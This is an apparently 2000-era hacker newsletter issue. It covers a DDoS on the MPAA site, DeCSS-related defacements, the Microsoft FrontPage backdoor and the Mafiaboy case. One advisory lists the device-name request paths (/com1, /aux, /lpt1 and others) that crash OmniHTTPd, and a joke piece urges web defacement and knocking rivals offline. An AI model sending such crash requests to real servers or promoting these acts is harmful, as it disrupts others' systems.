   SYNOPSIS (READ THIS)
   --------------------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you
    ~~~~~~~  are reading this from some interesting places, make my day and 
             get a mention in the zine, send in a postcard, I realize that 
             some places it is cost prohibitive but if you have the time and
             money be a cool dude / gal and send a poor guy a postcard 
             preferably one that has some scenery from your place of 
             residence for my collection, I collect stamps too so you kill
             two birds with one stone by being cool and mailing in a postcard,
             return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) 
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.
    
    
    Stuff you can email:
    
    - Prank phone calls in .ram or .mp* format
    - Fone tones and security announcements from PBX's etc
    - fun shit you sampled off yer scanner 
    - reserved for one smiley face ->        :-)            <-
    - PHACV lists of files that you have or phac cd's you own (we have a burner)
    - burns of phac cds (email first to make sure we don't already have em)
    - Any and all telephone sounds/tones/beeps/trunk drops/line tests/etc 
    

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

     TV film on script kiddies
     Wed May 17 15:26:27 2000


     Hi HWA,

     Am working on a big new film about kid hackers / crackers / script kiddies
     for British TV. Treating them not as anti-corporate heroes, or geniuses, 
     but as willful, cat burgling pranksters.

     I need to find some contacts for hackers (and their admirers!) before the
     end of this week...

     This isn't some lame documentary exposing people, this is a cool story, 
     not a news expose, happy for anyone to be anonymous, 

     Am on to all the usual suspects, but any new stories leads would be really
     appreciated. 

     thanks

     Lucian

     2600 registers verizonREALLYsucks.com going after Verizon Wireless. 
     And before this fucknbc.com ? What are they trying to prove? Anyone 
     have anything to say about this? I'm thinking of writing and article
     about it...give me some feedback.

      Hi folks;

      My apologies for the delay this time around, personal problems
      and other work commitments have kept me from my hobby. This is
      being remedied and things should pick up from here on in as we
      get organized.

      Here is some news for you.

      HWA-security.net has been registered and will be hosted by our
      good friends at Csoft (cheers Julien), check www.csoft.net for
      your hosting/vhost needs. They know their shiat. Site us under
      development and will be online soon.

      Once again we're looking for new staff members or volunteers
      to act as reporters, interviewers, news gatherers, file finders
      etc. More details in release #53 which will be released this weekend
      June 18th. 

      ---> Email me at cruciphux@dok.org

      ** Issue #53 will be released June 18th and will cover material and
      submissions from April 9th thru May 7th 2000.

      ** Issue #54 MAY be out this weekend also but I doubt it..we'll see
      how busy things get around here, #54 will contain the recent news
      and cover May 7th to present (release date). I will try my best to
      get #53 and #54 out close to each others release dates, i'm doing it
      this way to maintain coverage period per issue number.

      Hi again, 

      <cont'd part 2 of 2>

      We appreciate your staying with us and giving us support, although
      I'm largely doing this for selfish reasons and fun it is nice to
      hear others getting off on it too, I've decided to expand operations
      and offer more to the community.

      I've decided to become more organized and have taken on a staff to
      help with the production of the zine with an eye to keeping a more
      timely release date and more reliable/quality production. If you 
      can help send me an email with a mini resume listing your talents
      and areas you would be interested helping in.

      ** This is a non-profit venture. Sponsored by CUBESOFT. **

      Yes we're doing it all for fun, like the old days :)

      Many areas are open for you to offer help, think of this as a
      fresh startup, what is it? a cross between Securityfocus, HNN
      PacketStorm and the like. Sponsors are welcome, your donations
      or ads will be redirected into the development of this project.

         ((Hacking your way into a girlie's heart, etc))-((by: ch1ckie))
      
              
      
      ->Lesson One: Making Yourself Appear More Elite Than You Actually Are.
      
              -In real life, or on IRC, the most important thing that a girlie looks for in a hax0r is
              skill (she hopes it will move her up in the world), whether it is real skill (which is 
              hard to come by these days) or if its simply an elite host (hax0r@fbi.gov). 
              
              -To make yourself appear more elite than you actually are (or ever will be), the first 
              step is getting yourself an elite host (2845818@shellyeah.org probably won't cut it), 
              either by means of a shell, wingate, or bnc (and if you don't know of these things, just 
              tell the girl you admin some big network in your spare time and i'm sure she'll be 
              impressed).
      
              -In all retrospect, most girlies don't know the difference between _you_ and the real 
              thing, so don't worry.
      
              -Opposing popular use...to the majority of girlies, it is best not to use leet speak 
              (eye 4m 4 m45t0r hax0r); this will more often than not end up confusing them and leave 
              them bewildered. Thus, trying to impress them will prove useless. If you happen to have 
              a girl that knows 'leet speak', don't directly use this speak with her either, but use 
              it when she is in the premisis ("y0 m4ng, u b3tt4 ch3ck y0s3lf b4 u wr3ck y0s3lf"). This 
              will undoubtfully make you appear more elite/phearful than you actually are.
      
              -For those of you who are more 'skilled', deface webpages in the fair name of your 
              girlie... ("U R 0wned; mad props to my girlie"). This is a concept far beyond most 
              girlies, and seeing their name on www.yahoo.com proves very impressive.
      
      A few other methods of making yourself appear elite: 
      
      -obtaining operator status in as many channels as possible, do whatever you can to do so...
       suck dick, kiss ass, or stomp on some heads.
      
      -pinging out her enemies on command will impress/delight her enough to have even cyber sex with 
       you... might wanna keep that in mind.
      
      -using random 'big' words such as "heuristic control algorithm" or "pleisiochronous 
       communications" will be sure to impress... they do not even have to be in an order that makes 
       any sense. As long as your girlie hears 'big important words', she will believe that you are 
       elite...and the sad part is, that you will probably believe that you are too :(. 
      
      
      *Making yourself appear more elite than you actually are, is the first step to hacking your way 
      into a girlie's heart. Lesson two and three coming soon ('Making Your Girlie Feel Important', 
      and 'Understanding Your Girlie').*

04.0  [HWA] MPAA Site DoS'd off the net
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      April 12th 2000
      
      By: Cruciphux
      Source: Anonymous (one of the persons involved contacted us directly on IRC)
      Data: confirmed
      
      http://www.mpaa.org has been down for nine hours or so as I write this
      several T1's were employed in a distributed DoS attack against the site
      further information will be posted as I get it.      
      
      It is also rumoured that many sites affiliated with MPAA such as Tristar
      will also be going down over the next week.
      
      Some recent anti-MPAA defacements follow, the first site includes the
      full UUencoded source code to DeCSS, (This site was censored by
      Attrition for fear or reprimand from the MPAA I believe this is a 
      first for Attrition in censoring defaced pages. - Ed)
      
      http://www.safemode.org/mirror/2000/04/11/courtavenue_com/
      
      <Screwloose Logo>
      
      ... fuck censorship! a focus on MPAA(sic).
     
      You know one thing I am really brassed off about, and it has been going on since
      so-called "civilisation" existed. Is how censorship is controling our lives. Governments
      control people by the millions through forced relegions, cults, and conspiracies while
      ripping us off in the process. Enterprises and Government work hand in hand to
      exploit the common people. Enterprises use Governmnet as a tool to uphold
      censorship and inevitably generate revenue for them, and likewise for the government
      as they reap the taxes in return(that's why the US government won't take their finger
      out of their ass, and split up Microsoft and other overbloated monopolies which are
      very unethical with their business stratigies). Hmm, I know what your thinking "Isn't
      the idea of a 'democratic' government suppose to let the common people control their
      government, not the other way around?!?", yeah an your compleately right ....
      fascism is still commonplace even today in 1st world countries.
     
      Which brings me to the attention of MPAA(Motion Picture Association of America)
      who are trying to control how we watch DVD's, where we watch them, who we watch
      them with(does this include pets such as dust mites?!?), and what parts we watch. For
      example "Are we allowed to skip their brainwashing advertisments and other shit for
      which they want to control us with?". I feel paranoid when I have a friend watching a
      DVD with me just incase I am breaking the law. LOL! :/. Where does censorship end?!
      It's all DEEPLY psycological you know! MPAA have restrained the right for people to
      write drivers for no computer operating system other than Microsoft's very own
      "Windows" range, this means that you have to loose your precious uptimes of months
      on your unix systems for a few hours of entertainment(hardly seems worth it). 
     
      "...and remember all visionaries are fascist bastards!" - ScrewLoose
     
      Shouts go to...
     
      BlazinWeed, phov0s/datawar, and other nigguhs who inspired me. 
     
      Here is the DeCSS code
     
      This version of the code is for M$ Windows and is in the form of a ".dll"(dynamic link
      library). It can decrypt any information stored on every DVD CD, yes it's the code that
      MPAA don't want anyone just to pass it on OR EVEN LINK TO IT!!?!? I am deadly
      serious. It makes you think "What are those mother fuckers got to hide?". You could
      probably find a uu base64 decoder at davecentral for both Windows and Linux(if your
      distribution doesn't come with a version already). See for yourself... . .
     
      N.B.It is advised to rip this code straight from the HTML source to ensure
      that it is decoded 100% properly.

      /*********************************************************************/ 
      This mpaa issue has gone on long enough. We as a global community cannot afford to let america 
      control every aspect of our live. This isn't just about copying DVD's this is about retaining our rights 
      to intellectual freedoms which the government of america will gladly allow the mpaa violate. If I purchase 
      a dvd player I should have the right to do and/or view whatever I want on my private property. There 
      should  NO territorial lockout or encryption to stop me from using *my* property to its fullest. 
      
      The retarded excuse for territorial lockout given by the movie industry is that they are able to release 
      movies in countries at a time that would maximize there profits. The truth is however rather different 
      the reason territorial lockout exists on players is, so they can brainwash  harry homeowner with there 
      own doctrine and minimize the possibility of foreign governments releasing materials which can be viewed 
      by harry homeowner that would change his/her mind about certain political issues. 
      I fully support 2600's stance against corparate bullies , if mpaa thinks they can wipeout decss by taking 2600 
      offline they got another thing coming. 
      
      dowload css-auth below for the source code to decss (unix only) 
      
      css-auth.tar 
      
      download decss.zip below if your a windowz kid

      Shouts: everyone in wkD and everyone else thats down with me you know who you be 
      Fucks: mpaa (isn't that a suprise ?) , Freemasons and all you other bitches that sliped my mind 
      
      Attrition lamer of the week: Mcm4nus .. this kiddies is responsible for a truck load of hacks that say jack shit 
      "hacked by Mcm4nus " oh fuckin *pheer*. 
      kiddies please if your going to deface something then at least fuckin say something. 
      
      the decss link above obviously won't work when the admin removes the file so I also 
      enclose the uuencode of the zip and tarball if you don't know how to decode these you suck.

06.0  Project Gamma interviews SpaceRogue of HNN
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Space Rogue
      
       Date Published: March 12, 2000 Date Conducted: March 11, 2000 Interview 
       Conducted By: WHiTe VaMPiRe Interview Conducted With: Space Rogue
      
                  Space Rogue is the editor of the Hacker News Network, a member of 
                  L0pht Heavy Industries (Now @Stake) -- he also previously maintained 
                  the Whacked Mac Archives, one of the largest Macintosh 
                  hacking-related sites on the Internet. 
      
                  Questions are colored and Space Rogue's answers are indented. 
      
      
             How did you first get involved with computing? 
      
                  A door to door Osborne Salesperson came to my house. Showed us an 
                  Osborne One. While our family could not afford it $2,000+ that is 
                  where I started. I convinced him to come back several times on the 
                  premise of maybe we will buy it. In those few hours I learned a lot.
      
             What would you consider your first computer? 
      
                  Commodore 64.
      
             What projects were you involved with before the L0pht? 
      
                  Nothing anyone would know about.
      
             How did you get involved with the L0pht? 
      
                  I knew most of the other founders for years via local bulletin board 
                  systems.
      
             What are your feelings on the merger of the L0pht and @Stake? 
      
                  A good thing in general, it allows time and resources to be devoted 
                  to important projects that would never have been possible before.
      
             What initially brought you to create the Hacker News Network? 
      
                  I was sharing URLs with a small group of people and decided that it 
                  would be better to put them on the web and share them with a larger 
                  audiance.
      
             Many have noticed that after the L0pht / @Stake merger the commercial 
             content was removed from HNN. How else will the merger effect HNN? 
      
                  @Stake is commited to vendor neutrality which is why all 
                  advertisements where removed. You will also notice the removal of 
                  the HNN Store and no more T-shirt sales. In the future you can 
                  expect even more changes including even the name of the site as it 
                  gets integrated into the @Stake corporate web presence.
      
             What do you have planned for HNN's future? 
      
                  HNN's future is pretty much out of my hands at the moment.
      
             Do you have any comments on the medias interpretation of "hackers," 
             "crackers," and the related communities? 
      
                  This is an ongoing battle sometimes I think we are winning, and 
                  other times I think we have failed miserably. There are some 
                  journalists out there who actually 'get it' but many many others 
                  need to be educated.
      
             Do you think the media has at all improved with its coverage of 'hacking' 
             related topics in the past few years? 
      
                  Well they have given it more coverage, not sure if that qualifies as 
                  an improvement though. This is especially evident during fast moving 
                  critical stories such as the recent DDoS attacks. Some news outlets 
                  got it right but many more got it wrong.
      
             How do you think they could improve their coverage and cut down the FUD 
             (Fear, Uncertainty, and Doubt)? 
      
                  Education. Unfortunately many reporters have little to no 
                  understanding of technology.
      
             Why was the name of Project BootyCall changed to TBA? 
      
                  No comment.
      
             What is your opinion on Web site defacements? 
      
                  Most are childish and serve no purpose. You would think that people 
                  who are taking such an immense risk of going to jail would have 
                  something better to say that 'Props to my peeps.'

07.0  MS Engineers plant secret anti-Netscape password 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      MS admits planting secret password

      Microsoft engineers placed a password in
      server software that could be used to gain
      illicit access to hundreds of thousands of
      Internet sites worldwide.



      By Ted Bridis, WSJ Interactive Edition
      April 14, 2000 4:34 AM PT 


      Microsoft Corp. acknowledged Thursday that its
      engineers included in some of its Internet software a
      secret password -- a phrase deriding their rivals at
      Netscape as "weenies" -- that could be used to gain
      illicit access to hundreds of thousands of Internet
      sites worldwide. 

      The manager of Microsoft's security-response center,
      Steve Lipner, acknowledged the online-security risk in an
      interview Thursday and described such a backdoor
      password as "absolutely against our policy" and a firing
      offense for the as-yet-unidentified employees. 

      The company planned to warn customers as soon as
      possible with an e-mail bulletin and an advisory published
      on its corporate Web site. Microsoft (Nasdaq: MSFT)
      urged customers to delete the computer file--called
      "dvwssr.dll"--containing the offending code. The file is
      installed on the company's Internet-server software with
      Frontpage 98 extensions. 

      While there are no reports that the alleged security flaw
      has been exploited, the affected software is believed to be
      used by many Web sites. By using the so-called back
      door, a hacker may be able to gain access to key
      Web-site management files, which could in turn provide a
      road map to such things as customer credit-card
      numbers, said security experts who discovered the
      password. 

      Two security experts discovered the rogue computer code
      -- part of which was the denigrating comment "Netscape
      engineers are weenies!" -- buried within the 3-year-old
      piece of software. It was apparently written by a Microsoft
      employee near the peak of the hard-fought wars between
      Netscape Communications Corp. and Microsoft over their
      versions of Internet-browser software. Netscape later was
      acquired by America Online Inc. 

      One of the experts who helped identify the file is a
      professional security consultant known widely among the
      Internet underground as "Rain Forest Puppy." Despite his
      unusual moniker, he is highly regarded by experts and
      helped publicize a serious flaw in Microsoft's
      Internet-server software last summer that put hundreds of
      high-profile Web sites at risk of intrusion. 

      Almost every Web-hosting provider
      Russ Cooper, who runs the popular NT Bugtraq
      discussion forum on the Internet, estimated that the
      problem threatened "almost every Web-hosting provider." 

      "It's a serious flaw,"
      Cooper said. "Chances
      are, you're going to find
      some major sites that
      still have it enabled."
      Lipner of Microsoft said
      the company will warn
      the nation's largest
      Web-site providers
      directly. 

      In an e-mail to Microsoft earlier Thursday, Rain Forest
      Puppy complained that the affected code threatened to
      "improve a hacker's experience." Experts said the risk
      was greatest at commercial Internet-hosting providers,
      which maintain hundreds or thousands of separate Web
      sites for different organizations. 

      Lipner said the problem doesn't affect Internet servers
      running Windows 2000 or the latest version of its server
      extensions included in Frontpage 2000. 

                            The digital gaffe initially was
                            discovered by a
                            Europe-based employee of
                            ClientLogic Corp.
                            (www.clientlogic.com) of
                            Nashville, Tenn., which
                            sells e-commerce
      technology. The company declined to comment because
      of its coming stock sale. The other expert, Rain Forest
      Puppy, said he was tipped off to the code by a
      ClientLogic employee. 

      When asked about the hidden insult Thursday, Jon
      Mittelhauser, one of Netscape's original engineers, called
      it "classic engineer rivalry."

       Severity: Any user can simply crush remote server with installed
                 OmniHTTP daemon
       Author: sirius ( sirius@linuxfan.com )
       Homepage: www.b0f.com


       * Overview

      Quote from Omnicron Technologies Web site:

      "OmniHTTPd is a powerful all-purpose industry compliant web server built 
      specifically for       the Windows 95/98/NT4 platform. In addition to 
      Standard CGI support, the server sports advanced features such as 
      Keep-Alive connections, table auto-indexing and server-side includes. For 
      maximum performance, OmniHTTPd is both 32-bit and multi-threaded. Many 
      users agree that OmniHTTPd is the fastest and most compact web server 
      available for the Windows platform ..."

       * The Problem

      It is possible to crash OmniHttpD Pro. v2.06 (maybe other versions) 
      because it parse the       path strings to call some FAT32/VFAT routines 
      in the kernel which makes your system unstable and useless until next 
      reboot.

      If you request following directories:

      /com1,/com2,/com3,/aux,/lpt1,/lpt2,/clock$,/config$,/nul (and maybe others 
      but not /con)

      the web server accepts the connection.

      e.g. if you request /com3 directory on remote server and if it has a modem 
      device installed       on com. port 3 it will crash connection of remote 
      server and you will have to reboot the machine. 

      If you have installed device on com. ports and if the remote user request 
      directory which name       matches the name of one device driver (e.g. 
      /aux) it will crash that device ... if you succeed you will get error 403 
      : forbidden error.

       * Vulnerable Versions	

      - OmniHttpd version 2.06 Pro under Win98, NT not tested       - maybe 
      other earlier versions 

       * Fix

      Unknown for now, I mailed Omnicron Technologies ... they will probably fix 
      this bug in next       version.

       * Additional informations:

      Well, i played with this thing and went to SecurityFocus.com to check for 
      this bug and I       found securax security advisory 01 with some general 
      informations about this bug so if you need more informations read that

09.0  Judge bans Mitnick from taking part in tech conference 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Federal judge bans convicted hacker from taking part in tech conference 

      A federal judge Monday banned convicted computer hacker Kevin Mitnick 
      from taking part in a technology conference in Salt Lake City Wednesday. 
      Mitnick, who gained notoriety for his hacking exploits and spent several 
      years in a federal prison in Lompac, Calif., won't be sitting on a 
      computer security panel discussion at the Utah Information Technologies 
      Association conference at the Salt Palace Convention Center. The judge 
      kiboshed the appearance because Mitnick's prison release agreement 
      prohibits him from "consulting or advising" on the topic of 
      computer-related activity.

      Monday, Mitnick did an extended interview promoting the panel discussion 
      on KSL's Doug Wright Show, where he answered callers' questions about 
      computer security and told the story of       his hacking exploits. He 
      hacked for fun, he said, and never made any money from it.

      Richard Nelson, president of UITA, said Mitnick's public relations 
      representative had indicated that Mitnick had permission to appear from 
      the U.S. probation office in California. A few days ago,       the 
      organization learned he might not be able to leave California.

      Conference organizers are in the process of arranging a replacement for 
      Mitnick on the cyber-security panel. They are planning on bringing in a 
      senior staffer from a large company that deals       with cyber security.

      Nelson said he's sorry Mitnick can't participate. "He's eager to talk and 
      disappointed he can't come. If you listened (to him on the radio show), 
      he recognizes he made serious mistakes and       he wanted to go forward.

      "We're not trying to promote his career, but if he can help information 
      technology companies in Utah and decision makers dealing with security 
      issues determine what level of risk they want       to take, that's good. 
      There will always be risk, but you can reduce it by taking security 
      measures." The UITA conference, "Net Trends 2000: The Digital Revolution" 
      takes place Wednesday and Thursday.

      Hacker's friends may be suspects in cyberattacks

      By Kevin Johnson
      USA TODAY

      WASHINGTON -- Authorities investigating the February attacks on
      some of the most popular Internet sites are focusing on three close friends
      of the 15-year-old Canadian boy who was charged earlier this week, a
      senior U.S. law enforcement official said Thursday.

      The three friends of the Montreal computer hacker known as ''Mafiaboy''
      are among several potential suspects identified by authorities in the
      cyberassaults that temporarily shut down the Web sites of CNN, Yahoo,
      Amazon.com and several other media and commercial giants.

      Beyond Montreal, authorities are examining the activities of a small group
      of hackers thought to be based in Israel. Officials there say the group has
      been involved in various online financial crimes, some involving stolen
      credit card numbers.

      The group is believed to be part of a larger circle of computer users,
      including Mafiaboy, who have spent time in an Internet chat room called
      TNT. The chat room is accessible only by password.

      Investigators also are trying to determine whether Dennis Moran, a
      17-year-old New Hampshire hacker known online as ''Coolio,'' was
      involved in the attacks in February.

      Moran, who authorities say has boasted of being involved in the attacks,
      was charged last month in an attack on a Web site run by the Los Angeles
      Police Department.

      The unidentified Montreal teenager known as Mafiaboy has been charged
      only in two attacks against CNN.com, which was shut down for 3 1/2
      hours Feb. 8 after it was overloaded with requests.

      Mafiaboy claimed credit in chat rooms for similar assaults on sites run by
      Yahoo and Buy.com. Officials believe Mafiaboy may have been capable
      of directing all the assaults but doubt that he did.

      Analysts familiar with the assaults say the software used to wall off access
      to the CNN Web site on Feb. 8 was different and less sophisticated than
      that used to paralyze Yahoo on Feb. 7. 

      Michael Lyle, who runs a software security firm in Palo Alto, Calif., said
      the attack on CNN involved software commonly found on Internet sites
      for hackers.

      ''I literally could show you how to do it in three or four hours,'' he said.

      The goal is to flood Internet sites with tens of thousands of requests,
      disguising the source of the assault by routing the requests through
      high-capacity computers elsewhere. The tactic overloads the targeted
      Web sites, causing electronic paralysis.

      Investigators say Mafiaboy orchestrated the attack on CNN.com through
      computers at the University of California-Santa Barbara.

      A Canadian law enforcement official said that because of Mafiaboy's age,
      it is unlikely he would be sent to an adult prison if convicted of ''mischief to
      data.'' 

      If prosecuted and convicted as an adult, the teenager could face up to 20
      years in prison. But in Canada's juvenile system, he faces a maximum of
      two years in a youth detention center if convicted.

10.1  Mafiaboy reaction: "yeah right"

      Mafiaboy Reaction: 'Yeah, Right' 
      by Leander Kahney 

      2:20 p.m. Apr. 19, 2000 PDT 

      The hacking community is skeptical that the Canadian Royal Mounted Police 
      have nabbed the perpetrator of Februarys highly publicized denial of 
      service attacks. 

      Following news that the Mounties charged a Montreal juvenile in the 
      attacks, hackers are demanding evidence that the 15-year-old known by the 
      alias "Mafiaboy" was indeed involved. 

      "Im highly skeptical," said B.K. DeLong, a member of Attrition.org, an 
      Internet security group that monitors and archives website cracks and 
      defacement. 

      "I don't think they've found the person who did the attacks. I think law 
      enforcement is stalling the press and public to keep them off their backs 
      while they find the real person," DeLong said. 

      DeLong said his skepticism was based on what appears to be a paucity of 
      evidence linking "Mafiaboy" to the attacks. According to initial reports, 
      the RCMP found computer logs and the transcript of an online chat group 
      that led them       to file the charges against the teen, whose real 
      identity is shielded by Canadian law. 

      DeLong said law enforcement had already blundered in the case with the 
      arrest of Coolio, a.k.a. Dennis Moran, who was detained by New Hampshire 
      police in March in relation to the attacks, but later was charged with the 
      unrelated       defacement of a Los Angeles Police Department anti-drug 
      site. 

      DeLong also noted that denial of service attacks are notoriously difficult 
      to investigate and there has been a suspiciously long delay between the 
      attacks and the charges. 

      "I think they should show some definite evidence how they got this guy," 
      said Scully, editor of Cipherwar, a technology and politics site. "Chat 
      list logs are not enough." 

      Scully said that law enforcement agencies have a poor record of finding 
      and charging cyber-criminals, as evidenced by the four years notorious 
      computer hacker Kevin Mitnick was incarcerated awaiting trial. 

      This is the second time "Mafiaboy" has been linked to the attacks. 

      Mafiaboy - whoever that may be -- first was tabbed as a potential 
      perpetrator of the attacks by an Internet security firm about a week after 
      they occurred. 

      Even then, hackers expressed their doubts Mafiaboy was involved. 

      "I seriously doubt that this guy is an actual suspect," Space Rogue, 
      editor of the Hackers News Network, told Wired News at the time. "Maybe he 
      did it, but the information I have doesn't point to that at all."

      Like Mafia Son, Like Mafia Dad       Wired News Report 

      10:45 a.m. Apr. 21, 2000 PDT       Mafiaboy didn't fall far from the tree, 
      it seems. 

      Turns out the Canadian police tapped into some rather incriminating 
      telephone calls placed by the 15-year-old cracker's dad, who allegedly 
      took out a contract on a business colleague.

      Lieutenant Lenny Lechman said Mafiaboy's 45-year-old father was arrested 
      last week and charged with conspiring to commit bodily harm. 

      "We felt that before somebody gets hurt really badly, we had to intervene 
      as quickly as possible," Lechman said. 

      Mafiaboy was charged earlier this week with two counts of mischief for a 
      Feb. 8 denial-of-service attack on CNN.com. He was fingered as a suspect 
      back in February by Michael Lyle, chief technical officer of 
      Internet-security firm       Recourse Technologies Inc.. 

      Mafiaboy's dad, whose real name is John Calce, was released on bail 
      Monday. 

      Mafiaboy himself has also been released, with a Kevin Mitnickian-like 
      stipulation that he stay away from computers. 

      Canadian police said they are still analyzing data found on the alleged 
      cracker's seized computers.

10.3  On another mafiaboy note, a new site has popped up on Geocities

      http://www.geocities.com/freemafiaboy/


      gullible adj 1: easily deceived or tricked ; synonymous with Michael Lyle 

 

      Michael Lyle is considered to be a computer security expert....
      
      He is cofounder and Chief Technology Officer of Recourse Technologies in 
      sunny Palo Alto California, which sells anti-hacker software programs. 
      Also, he used to work for Exodus Communications whom experienced an 
      embarrassing hacker break-in while he was employed there, and admits
      that he himself used to be a hacker. He goes by the nickname Icee on IRC.
      
      He told ABC he had communicated with Mafiaboy on IRC, and the 15-year-old
      said he had attacked not only CNN.com but also E+Trade. Their is now 
      definitive proof that he was NOT talking with whom he believed was mafiaboy.
      
       
      
      Mafiaboy is a 15 year old Canadian.
      
      He was arrested on April 15 and charged with two counts of mischief to data
      for the attack that jammed up to 1,200 CNN-hosted Web sites for four hours 
      Feb. 8.
      
       
      
      This website documents the extreme carelessness Michael Lyle showed in his
      "investigation" of the DDoS attacks that recently plagued CNN, Yahoo,Amazon,
      and E-trade. He is quoted in multiple news articles saying that he had 
      conversations on IRC with "mafiaboy", who he claims admitted to the attacks
      on CNN and E-trade. The methods he used to accertain that this was the the
      real "mafiaboy" or if "mafiaboy" actually launched any of these attacks were
      extremely inefficient. This website contains concrete proof(from 2600.com) 
      that on at least one occasion he was not talking to who he believed was 
      mafiaboy. He later cited information from that same conversation in an 
      interview with ABC. The General Public should not be constantly under 
      these misconceptions the media is providing. Upon reading the IRC logs
      from 2600.com you will certainly question how gullible Michael Lyle is.
      Maybe he was just to focused on the fact of catching the perpetrator of
      these "hacker" crimes, so he could claim fame to himself and his company
      Recourse Technologies.... and get rich in the process.
      
       
      
      Is Mafiaboy real or a creation of the media? 04/20/00 
      
      This is the link to the IRC logs which show Michael's conversation with 
      whom he believed was mafiaboy. Icee is Michael Lyle, while "[mafiaboy]" 
      is someone from 2600 staff posing as him. This is an extremely hilarious
      conversation when you take into the fact that this is all a joke played 
      on the "security expert" Michael Lyle.

10.4  Mafiaboy:Probe of Hacker Nets a Second Suspect: His Father

      Probe of Hacker Nets a Second Suspect: His Father 
      
      By Steven Pearlstein and David A. Vise
      Washington Post Staff Writers
      Friday , April 21, 2000 ; A01 
      
      ILE-BIZARD, Quebec -- There may be more to the computer moniker "Mafiaboy"
      than first believed.
      
      Montreal police said today that they moved in on the 15-year-old hacker 
      last weekend after learning from wiretaps that his father had taken out a 
      contract to harm or       frighten a business associate and that the 
      attack was imminent. They had wiretapped the boy's house shortly after 
      U.S. and Canadian investigators identified that someone who lived there 
      had launched a disabling computer attack that had shut down CNN's Web           
      site and possibly other big sites in February.

      "We didn't think we could wait any longer," a Canadian police official 
      said.

      Mafiaboy had bragged in online chats and to friends that he had taken down 
      CNN.com, Amazon.com, Buy.com, eBay and E-Trade, but they didn't believe 
      him. Federal law         enforcement officials in Canada and the United 
      States took note, however, following       up on tips and tracing the 
      electronic path that led to Mafiaboy's neighborhood in the West Island 
      section of Montreal, sources familiar with the probe said.
      
      The wiretaps were intended to pick up evidence against the boy and leads 
      about possible collaborators. Inadvertently, however, a police official 
      said they also             picked up phone conversations from the boy's 
      45-year-old father, president of a transportation company, as he conspired 
      with a hit man about harming or scaring a business associate.

      Police moved in on both father and son at 3 a.m. Saturday at their home, 
      charging the son with two counts of "mischief" with data and the father 
      with two counts of         conspiracy to cause bodily harm. 

      The father, John Calce, was released Monday on $2,000 (U.S.) bail and 
      ordered not to get within 300 yards of the house or office of the man he 
      had allegedly                targeted. 

      The boy was also released from detention on the condition that he not 
      associate with his three closest friends. Canadian law enforcement 
      officials said yesterday           they wanted to prevent Mafiaboy from 
      using computers belonging to his friends and also did not       want him 
      to attempt to silence his friends, who could be witnesses against him in 
      the case.

      The Royal Canadian Mounted Police, which is handling the investigation of 
      Mafiaboy's computer hacking, indicated today it expects further charges 
      will be brought           against the boy once they have had a chance to 
      review all of the evidence and the weeks of       wiretaps on the house. 
      U.S. and Canadian authorities also expect to charge others who may or may 
      not have collaborated with the Montreal boy, whom police described         
      as a somewhat amateurish hacker.

      There are no indications that the boy is cooperating with the 
      investigation, and his attorney said yesterday that he intends to shift 
      the focus from his client to          the Web sites that should have 
      better protected themselves against computer vandalism.

      "We can already foresee a long, complex and very technical trial which 
      will certainly shed light on how a 15-year-old could have done what he is 
      accused of, to a           multinational corporation which almost 
      certainly could have been expected to be equipped with the       most 
      sophisticated and up-to-date security systems," said lawyer Yan 
      Romanowski.

      The Riverdale High School student with the Mafiaboy screen name struggled 
      in classes and was transferred to Riverdale this year after being 
      suspended repeatedly from       another school closer to his home, 
      classmates and law enforcement officials confirmed       today. They said 
      he excelled in one course: computers.

      Known as a computer whiz but a constant discipline problem--he had been 
      suspended from Riverdale twice this year--he frequently talked back to his 
      English and math         teachers, banging his desk and rarely showing up 
      for class with books and completed       homework, according to friends 
      and classmates who gathered for hot dogs today at La Belle Province, one 
      block from the campus. 

      The friends, all of whom declined to give their names, said Mafiaboy had 
      been bragging about his hacking exploits for the past several weeks.

      "I didn't believe him," said one. "He was a bit of a showoff."

      "He had a real attitude," said another as he waited for the No. 205 bus 
      after school. "He wanted to graduate someday, but he knew he had 
      problems."

      Mafiaboy was described by his classmates as bright, engaging, outgoing and 
      loyal to his friends. He hung out generally with the tough guys and was 
      known to smoke           cigarettes. In dress, he favors baggy pants, a 
      loose-fitting yellow jacket and Nike T-shirts and       shoes.

      "He likes to chill the girls after school," said one student having a 
      cigarette at "The Pit," the unofficial smoking area just outside the 
      school fence, at lunch           time. Although he is said to have had one 
      or two girlfriends over the years, he does not have one now,       
      classmates said.

      The 5-foot-11 youth played guard in a Saturday afternoon basketball league 
      on a team called the Brookwood Jazz. He may have more time to shoot hoops 
      in the weeks           ahead, since conditions of his release forbid him 
      from using the Internet, entering a business with computers or going into 
      a computer store. He is only allowed to use computers at school under the 
      strict supervision of teachers and even then, is not allowed         to 
      access the Internet. Canadian police are examining the computers seized 
      from the boy's house in the Saturday morning raid.

